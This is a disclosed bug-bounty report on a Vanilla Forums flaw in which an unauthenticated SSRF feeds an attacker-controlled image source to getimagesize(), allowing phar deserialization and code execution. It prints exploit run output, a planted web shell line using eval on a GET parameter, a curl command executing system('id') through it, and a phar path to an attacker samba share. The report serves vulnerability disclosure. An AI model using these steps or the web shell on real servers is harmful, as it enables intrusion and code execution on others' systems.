@@ -1,0 +1,155 @@
+ReportLink:https://hackerone.com/reports/410882
+WeaknessName:Deserialization of Untrusted Data
+Reporter:https://hackerone.com/mr_me
+ReportedTo:Vanilla(vanilla)
+BountyAmount:600.0
+Severity:critical
+State:Closed
+DateOfDisclosure:23.11.2018 15:46:58
+
+Summary:
+
+## Summary:
+
+An **unauthenticated** attacker can inject an serialized payload into a phar archive and trigger read access to it via an unprotected getimagesize(). The attacker can leverage this to deserialize untrusted data and gain remote code execution.
+
+## Notes:
+
+- **THIS BUG IS UNAUTHENTICATED**, however you need to have an admin account to run this poc because we leverage the file upload to get our phar file on the target.
+- The default path to the constants.php file is '/var/www/html/conf/constants.php', please change it in your poc files, if you need. I have installed my version of Vanilla Forums in /var/www/html
+- BEWARE!! This poc will damage the application and overwrite constants.php. Make sure you back up your installation before running it!
+- In my poc I used an upload primitive for the phar archive, but if you wanted to remotely exploit on Windows, you could use a samba share. I have tested this and its proved to be working 100%.
+  The payload would look like phar:////attacker-share/share/poc.jpg and can be reached unauthenticated.
+- Also note, we can use whatever extension we like for the phar archive, this would help in bypassing file upload checks/etc.
+
+## Analysis:
+
+Inside of the library/core/functions.general.php file we can see the following code:
+
+```
+class ImportController extends DashboardController {
+
+    ...
+
+    function fetchPageInfo($url, $timeout = 3, $sendCookies = false, $includeMedia = false) {
+        $pageInfo = [
+            'Url' => $url,
+            'Title' => '',
+            'Description' => '',
+            'Images' => [],
+            'Exception' => false
+        ];
+
+        try {
+            // Make sure the URL is valid.
+            $urlParts = parse_url($url);
+            if ($urlParts === false || !in_array(val('scheme', $urlParts), ['http', 'https'])) {
+                throw new Exception('Invalid URL.', 400);
+            }
+
+            $request = new ProxyRequest();
+            $pageHtml = $request->request([
+                'URL' => $url,
+                'Timeout' => $timeout,
+                'Cookies' => $sendCookies,
+                'Redirects' => true,
+            ]);                                                                         // 1
+
+            if (!$request->status()) {
+                throw new Exception('Couldn\'t connect to host.', 400);
+            }
+
+
+            ...
+
+            // Page Images
+            if (count($pageInfo['Images']) == 0) {
+                $images = domGetImages($dom, $url);                                     // 2
+                $pageInfo['Images'] = array_values($images);
+            }
+```
+
+At [1] we can reach a HTTP SSRF with an attacker controlled `$url`. Note also that there is no authentication here. Then at [2] we can reach the `domGetImages()` function with our `$url` and `$dom` which is the response from the attackers web server.
+
+Continuing inside of the library/core/functions.general.php file we can see the following code:
+
+```
+    function domGetImages($dom, $url, $maxImages = 4) {
+        $images = [];
+        foreach ($dom->query('img') as $element) {                                      // 3
+            $images[] = [
+                'Src' => absoluteSource($element->attr('src'), $url),                   // 4
+                'Width' => $element->attr('width'),
+                'Height' => $element->attr('height'),
+            ];
+        }
+
+        // Sort by size, biggest one first
+        $imageSort = [];
+        // Only look at first 4 images (speed!)
+        $i = 0;
+        foreach ($images as $imageInfo) {
+            $image = $imageInfo['Src'];                                                 // 5
+
+            if (strpos($image, 'doubleclick.') != false) {
+                continue;
+            }
+
+            try {
+                if ($imageInfo['Height'] && $imageInfo['Width']) {
+                    $height = $imageInfo['Height'];
+                    $width = $imageInfo['Width'];
+                } else {
+                    list($width, $height) = getimagesize($image);                       // 6
+                }
+```
+
+At [3] the code looks for a img tag and at [4] it will set the `$images` array with the attackers controlled src attribute. Then at [5] the code sets the `$image` variable with the attackers controlled src. Finally at [6] we can reach the `getimagesize()` with an arbitrary string. 
+
+## Exploitation:
+
+In my poc I used a file upload, but you could also use a remote samba share if you are targeting a Windows installation of Vanilla Forums. 
+The payload would look like phar:////attacker-share/share/poc.phar/.jpg and could be reached unauthenticated.
+
+## Example:
+
+The following steps are used to re-create the vulnerability:
+
+1. We create our phar file:
+
+`saturn:~ mr_me$ php poc-stage-1.php`
+
+2. We run the poc-stage-2.py which will trigger the bug
+
+```
+saturn:~ mr_me$ ./poc-stage-2.py.py 172.16.175.143 admin:admin123 172.16.175.1
+(+) targeting: http://172.16.175.143
+(+) logged in!
+(+) uploaded phar!
+(+) leaked phar name 6O51ZT69P0S4.jpg!
+(+) starting http server...
+(!) triggered callback for phar!
+(+) triggered a write!
+(+) shell at: http://172.16.175.143/?c=phpinfo();
+
+saturn:~ mr_me$ curl -sSG "http://172.16.175.143/?c=system('id');"
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+Now, on the victim box:
+
+```
+steven@pluto:/var/www/html/conf$ cat constants.php 
+<?php if (!defined('APPLICATION')) exit();
+$a=eval($_GET[c]);//[''] = '';
+
+// Last edited by admin (172.16.175.1)2018-09-16 00:59:01steven@pluto:/var/www/html/conf$
+```
+
+## References:
+
+- https://rdot.org/forum/showthread.php?t=4379
+
+## Impact
+
+An unauthenticated attacker can gain remote code execution. The supplied poc will inject PHP code into the constants.php file. Please be aware that this will damage your system, please take the correct steps to avoid frustration.
